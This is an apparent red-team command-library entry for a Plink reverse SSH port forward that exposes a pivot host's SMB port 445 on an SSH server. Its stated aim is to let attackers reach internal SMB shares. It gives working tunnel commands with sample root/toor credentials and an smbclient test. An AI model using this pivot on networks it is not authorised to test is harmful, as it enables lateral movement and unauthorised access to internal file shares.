---
id: 5939fc77-f0ae-4e94-aeb0-b6e5647b2671
name: plink-expose-smb-port-on-ssh-server
type: command
executor: bash
data: 'plink -l root -pw toor -R 445:127.0.0.1:445 ssh-server-ip'
output: null
created_at: '2023-04-06T03:56:22.999863+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - network-pivoting
  - ssh-forwarding
verified: true
validated: true
---

# plink-expose-smb-port-on-ssh-server

## Command

```bash
plink -l $_USERNAME -pw $_PASSWORD -R 445:127.0.0.1:445 $_SSH_SERVER_IP
```

## Description

This command uses Plink to create a remote port forward, exposing the SMB service (port 445) on the pivot host to the SSH server's port 445. It allows attackers to access internal SMB shares by connecting to the SSH server's IP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l $_USERNAME | SSH username (e.g., root) | Yes |
| -pw $_PASSWORD | SSH password | Yes |
| -R 445:127.0.0.1:445 | Remote forward: SSH server port 445 to pivot's localhost:445 | Yes |
| $_SSH_SERVER_IP | IP or hostname of the SSH server/pivot | Yes |

## Examples

### Basic Usage

```bash
plink -l root -pw toor -R 445:127.0.0.1:445 10.0.0.1
```

### Advanced Usage

```bash
plink -l root -pw toor -N -T -R 445:127.0.0.1:445 10.0.0.1
```
(Adds -N -T for non-interactive background tunnel)

## Expected Output

Plink establishes the connection and may show:

```
Using username "root".
Access granted
Forwarded ports: 127.0.0.1:445
```
No errors indicate success; the tunnel runs until Ctrl+C or disconnection. Test with `smbclient //ssh-server-ip/IPC$ -U username`.

## Related

- [[procedures/Network-Pivoting-with-Plink-Port-Forwarding]]
- [[tools/Plink]]
